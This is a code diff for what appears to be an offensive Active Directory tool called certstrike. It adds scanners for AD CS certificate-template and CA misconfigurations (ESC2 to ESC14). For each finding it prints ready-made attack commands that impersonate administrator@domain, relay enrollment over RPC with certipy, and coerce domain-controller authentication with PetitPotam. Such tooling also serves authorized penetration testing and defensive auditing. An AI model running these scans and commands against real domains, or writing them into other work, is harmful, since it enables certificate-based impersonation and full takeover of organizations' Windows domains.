@@ -168,6 +168,38 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
+	// ESC2: Any Purpose EKU templates
+	fmt.Println("\n[*] Scanning for ESC2 (Any Purpose EKU templates)...")
+	esc2Findings, err := pki.ScanESC2(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC2 scan failed: %v\n", err)
+	} else if len(esc2Findings) == 0 {
+		fmt.Println("[+] ESC2: No Any Purpose EKU templates found.")
+	} else {
+		fmt.Printf("\n[!] ESC2 VULNERABLE — %d finding(s):\n\n", len(esc2Findings))
+		for _, f := range esc2Findings {
+			fmt.Printf("    Template: %s\n", f.TemplateName)
+			fmt.Printf("    EKUs:     %s\n", strings.Join(f.EKUs, ", "))
+			fmt.Println()
+		}
+	}
+
+	// ESC3: Enrollment Agent templates
+	fmt.Println("\n[*] Scanning for ESC3 (Enrollment Agent templates)...")
+	esc3Findings, err := pki.ScanESC3(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC3 scan failed: %v\n", err)
+	} else if len(esc3Findings) == 0 {
+		fmt.Println("[+] ESC3: No Enrollment Agent templates found.")
+	} else {
+		fmt.Printf("\n[!] ESC3 VULNERABLE — %d finding(s):\n\n", len(esc3Findings))
+		for _, f := range esc3Findings {
+			fmt.Printf("    Template:           %s\n", f.TemplateName)
+			fmt.Printf("    Enrollment Agent:   %v\n", f.EnrollmentAgentEKU)
+			fmt.Println()
+		}
+	}
+
 	// ESC5: CA object ACL inspection via nTSecurityDescriptor parsing
 	fmt.Println("\n[*] Scanning CA objects for ESC5 (dangerous ACLs on CA itself)...")
 	esc5Findings, err := pki.ScanESC5(cfg)
@@ -182,6 +214,47 @@ func runEnumerate(cmd *cobra.Command) error {
 			fmt.Printf("    DN:      %s\n", f.CADN)
 			fmt.Printf("    Trustee: %s\n", f.Trustee)
 			fmt.Printf("    Rights:  %s  (mask=0x%08x)\n", strings.Join(f.Rights, ", "), f.AccessMask)
+			fmt.Println()
+		}
+	}
+
+	// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on enrollment service
+	fmt.Println("\n[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA)...")
+	esc6Findings, err := pki.ScanESC6(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC6 scan failed: %v\n", err)
+	} else if len(esc6Findings) == 0 {
+		fmt.Println("[+] ESC6: No CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 enabled.")
+	} else {
+		fmt.Printf("\n[!] ESC6 VULNERABLE — %d finding(s):\n\n", len(esc6Findings))
+		for _, f := range esc6Findings {
+			fmt.Printf("    CA:        %s\n", f.CAName)
+			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
+			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
+			if len(f.Templates) > 0 {
+				fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
+			}
+			fmt.Printf("    Exploit:   certstrike pki --esc 6 --template <ANY_TEMPLATE> --upn administrator@%s --target-dc %s --domain %s\n", cfg.Domain, cfg.TargetDC, cfg.Domain)
+			fmt.Println()
+		}
+	}
+
+	// ESC7: Vulnerable CA ACLs (ManageCA / ManageCertificates)
+	fmt.Println("\n[*] Scanning for ESC7 (vulnerable CA ACLs)...")
+	esc7Findings, err := pki.ScanESC7(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC7 scan failed: %v\n", err)
+	} else if len(esc7Findings) == 0 {
+		fmt.Println("[+] ESC7: No CAs with exploitable ManageCA/ManageCertificates ACLs.")
+	} else {
+		fmt.Printf("\n[!] ESC7 VULNERABLE — %d finding(s):\n\n", len(esc7Findings))
+		for _, f := range esc7Findings {
+			fmt.Printf("    CA:                  %s\n", f.CAName)
+			fmt.Printf("    Trustee (SID):       %s\n", f.Trustee)
+			fmt.Printf("    ManageCA:            %v\n", f.ManageCA)
+			fmt.Printf("    ManageCertificates:  %v\n", f.ManageCertificates)
+			fmt.Printf("    Access Mask:         0x%08x\n", f.AccessMask)
+			fmt.Printf("    Exploit:   certstrike pki --esc 7 --ca %q --upn administrator@%s --target-dc %s --domain %s\n", f.CAName, cfg.Domain, cfg.TargetDC, cfg.Domain)
 			fmt.Println()
 		}
 	}
@@ -473,14 +546,14 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	upn, _ := cmd.Flags().GetString("upn")
 	output, _ := cmd.Flags().GetString("output")
 
-	// ESC8/ESC12 are relay scans — they don't require --template or --upn
+	// ESC5/8/10/11/12/14 are scan-only — they don't require --template or --upn
 	escID := strings.ToLower(strings.TrimPrefix(strings.ToLower(exploit), "esc"))
-	isRelay := escID == "8" || escID == "12"
+	isScanOnly := escID == "5" || escID == "8" || escID == "10" || escID == "11" || escID == "12" || escID == "14"
 
-	if templateName == "" && !isRelay {
+	if templateName == "" && !isScanOnly {
 		return fmt.Errorf("--template is required for exploitation (e.g. --template User)")
 	}
-	if upn == "" && !isRelay {
+	if upn == "" && !isScanOnly {
 		return fmt.Errorf("--upn is required for exploitation (e.g. --upn administrator@%s)", cfg.Domain)
 	}
 	if upn != "" && !strings.Contains(upn, "@") {
@@ -580,8 +653,92 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		fmt.Println("\n[*] After obtaining the certificate via DCOM relay:")
 		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
 		return nil
+	case "5":
+		// ESC5 is a CA-level ACL finding — scan for vulnerable PKI object ACLs
+		esc5Findings, scanErr := pki.ScanESC5(cfg)
+		if scanErr != nil {
+			return fmt.Errorf("ESC5 scan failed: %w", scanErr)
+		}
+		if len(esc5Findings) == 0 {
+			fmt.Println("[*] No vulnerable PKI object ACLs found (ESC5).")
+			return nil
+		}
+		fmt.Println("\n[!] ESC5 — Vulnerable PKI object ACLs on CA:")
+		for _, f := range esc5Findings {
+			fmt.Printf("\n    CA: %s\n", f.CAName)
+			fmt.Printf("    Trustee (SID): %s\n", f.Trustee)
+			fmt.Printf("    Rights: %s\n", strings.Join(f.Rights, ", "))
+		}
+		fmt.Println("\n[*] These ACLs allow modifying CA configuration objects.")
+		fmt.Printf("    An attacker with these rights can reconfigure the CA to enable ESC6/ESC7 attacks.\n")
+		fmt.Printf("    Next: certstrike pki --esc 7 --ca <CA_NAME> --upn %s --target-dc %s --domain %s -u <user> -p <pass>\n", upn, cfg.TargetDC, cfg.Domain)
+		return nil
+	case "10":
+		// ESC10 is a domain config finding — scan for weak certificate mapping methods
+		esc10Findings, scanErr := pki.ScanESC10(cfg)
+		if scanErr != nil {
+			return fmt.Errorf("ESC10 scan failed: %w", scanErr)
+		}
+		if len(esc10Findings) == 0 {
+			fmt.Println("[*] No weak certificate mapping configurations found (ESC10).")
+			return nil
+		}
+		for _, f := range esc10Findings {
+			fmt.Println("\n[!] ESC10 — Weak certificate mapping detected:")
+			fmt.Printf("    CertificateMappingMethods: 0x%x\n", f.MappingMethods)
+			fmt.Printf("    UPN Mapping Enabled: %v\n", f.UPNMappingEnabled)
+			fmt.Printf("    S4U2Self Enabled: %v\n", f.S4U2SelfEnabled)
+			fmt.Printf("    StrongCertificateBindingEnforcement: %d\n", f.BindingEnforcement)
+			if len(f.VulnerableTemplates) > 0 {
+				fmt.Printf("    Vulnerable Templates: %s\n", strings.Join(f.VulnerableTemplates, ", "))
+			}
+		}
+		fmt.Println("\n[*] Weak mapping allows certificate-based impersonation without strong binding.")
+		fmt.Printf("    Exploit via ESC9: certstrike pki --esc 9 --template <TEMPLATE> --upn %s --attacker-dn <DN> --target-dc %s --domain %s -u <user> -p <pass>\n", upn, cfg.TargetDC, cfg.Domain)
+		return nil
+	case "11":
+		// ESC11 is a CA-level finding — scan for RPC interfaces not enforcing encryption
+		esc11Findings, scanErr := pki.ScanESC11(cfg)
+		if scanErr != nil {
+			return fmt.Errorf("ESC11 scan failed: %w", scanErr)
+		}
+		if len(esc11Findings) == 0 {
+			fmt.Println("[*] No CAs with unencrypted RPC enrollment found (ESC11).")
+			return nil
+		}
+		fmt.Println("\n[!] ESC11 — RPC enrollment without encryption enforcement:")
+		for _, f := range esc11Findings {
+			fmt.Printf("\n    CA: %s (%s)\n", f.CAName, f.CAHostname)
+			fmt.Printf("    IF_ENFORCEENCRYPTICERTREQUEST: %v\n", f.EnforcesEncryption)
+			fmt.Printf("    Flags: 0x%x\n", f.Flags)
+		}
+		fmt.Println("\n[*] RPC enrollment without encryption allows relay attacks via ICertPassage:")
+		fmt.Printf("    certipy relay -target rpc://<CA_HOST> -template %s\n", templateName)
+		fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
+		return nil
+	case "14":
+		// ESC14 is a template+domain config finding — scan for weak explicit mappings
+		esc14Findings, scanErr := pki.ScanESC14(cfg)
+		if scanErr != nil {
+			return fmt.Errorf("ESC14 scan failed: %w", scanErr)
+		}
+		if len(esc14Findings) == 0 {
+			fmt.Println("[*] No templates vulnerable to weak explicit mapping found (ESC14).")
+			return nil
+		}
+		fmt.Println("\n[!] ESC14 — Weak explicit certificate mapping:")
+		for _, f := range esc14Findings {
+			fmt.Printf("\n    Template: %s\n", f.TemplateName)
+			fmt.Printf("    Schema Version: %d\n", f.SchemaVersion)
+			fmt.Printf("    Allows Explicit Mapping: %v\n", f.AllowsExplicitMapping)
+			fmt.Printf("    Strong Mapping Required: %v\n", f.StrongMappingRequired)
+			fmt.Printf("    StrongCertificateBindingEnforcement: %d\n", f.BindingEnforcement)
+		}
+		fmt.Println("\n[*] Weak explicit mapping allows certificate-to-account binding manipulation.")
+		fmt.Printf("    Combined with write access to altSecurityIdentities, this enables impersonation.\n")
+		return nil
 	default:
-		return fmt.Errorf("unsupported ESC: %s (supported: 1, 2, 3, 4, 6, 7, 8, 9, 12, 13)", exploit)
+		return fmt.Errorf("unsupported ESC: %s (supported: 1-14)", exploit)
 	}
 
 	if err != nil {
